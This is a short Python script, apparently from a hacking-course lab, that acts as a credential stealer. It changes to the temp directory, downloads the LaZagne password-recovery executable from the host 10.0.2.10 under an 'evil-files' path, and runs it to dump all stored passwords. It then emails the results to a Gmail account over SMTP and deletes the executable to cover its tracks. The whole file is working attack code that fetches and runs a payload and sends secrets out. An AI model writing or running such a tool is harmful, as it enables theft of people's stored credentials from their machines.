#!/usr/bin/env python

import requests
import subprocess
import smtplib
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://10.0.2.10/evil-files/laZagne_x64.exe")
result = subprocess.check_output("laZagne_x64.exe all", shell=True)
send_mail("EMAIL@gmail.com", "PASSWORD", result)
os.remove("laZagne_x64.exe")
